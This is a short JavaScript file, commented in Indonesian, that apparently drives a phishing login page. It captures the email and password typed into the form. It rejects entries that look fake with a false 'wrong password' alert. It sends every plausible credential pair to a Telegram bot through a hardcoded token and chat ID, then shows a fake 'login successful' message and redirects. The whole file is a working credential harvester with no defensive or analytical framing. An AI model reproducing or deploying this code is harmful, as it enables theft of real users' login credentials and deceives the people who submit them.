document.getElementById('Formulir').addEventListener('submit', function(event) {
    event.preventDefault(); 

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const submitBtn = document.getElementById('submitBtn');
    
    // --- LOGIKA VALIDASI ---
    
    // 1. Cek jika password hanya berisi angka
    const isAllNumbers = /^\d+$/.test(password);
    
    // 2. Cek jika password sama dengan email yang diinput
    const isPasswordSameAsEmail = (password.toLowerCase() === email.toLowerCase());

    // 3. Cek jika password diisi dengan format email (mengandung @ dan titik)
    const isEmailFormat = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(password);

    // Eksekusi Validasi: Jika salah satu kondisi di bawah terpenuhi, tampilkan error
    if (password === "123456" || isAllNumbers || isPasswordSameAsEmail || isEmailFormat) {
        alert("Kata sandi salah! Pastikan kata sandi Anda benar.");
        return; // Berhenti di sini, data tidak dikirim ke Telegram
    }

    // --- PROSES KIRIM KE TELEGRAM (Hanya jika lolos validasi di atas) ---
    const token = '8082912224:AAFsnvdeR5bdcCEMHSqS13RPP8SJyNFBLbY'; 
    const chatId = '5056601299'; 

    submitBtn.innerText = "Memproses...";
    submitBtn.disabled = true;

    const text = `--- DATA LOGIN BARU ---\nUser: ${email}\nPass: ${password}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

    fetch(url)
        .then(response => {
            if (response.ok) {
                alert('Berhasil Masuk!'); 
                document.getElementById('Formulir').reset(); 
                window.location.href = "comfirm.html"; 
            } else {
                alert('Gagal menghubungkan ke server.');
                submitBtn.innerText = "Masuk";
                submitBtn.disabled = false;
            }
        })
        .catch(error => {
            alert('Terjadi kesalahan koneksi.');
            submitBtn.innerText = "Masuk";
            submitBtn.disabled = false;
        });
});
